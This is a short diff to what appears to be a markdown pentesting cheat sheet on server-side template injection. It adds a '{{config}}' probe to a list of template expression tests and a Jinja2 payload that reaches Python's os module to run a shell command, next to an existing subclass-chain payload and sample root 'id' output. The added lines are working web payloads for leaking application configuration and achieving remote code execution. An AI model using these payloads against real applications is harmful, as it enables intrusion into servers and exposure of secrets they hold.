@@ -324,6 +324,7 @@ ${7*7}
 <%= 7*7 %>
 ${{7*7}}
 #{7*7}
+{{config}}
 ```
 #### [2] if the app reflects the output as `49`.Then there might be a RCE possible.
 #### [3] now encode the payload in basse64.
@@ -360,7 +361,9 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 #### [+] or we can try those above commands also, if the previous one doesn't works.
-
+```
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
 ```python
 {{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
 ```
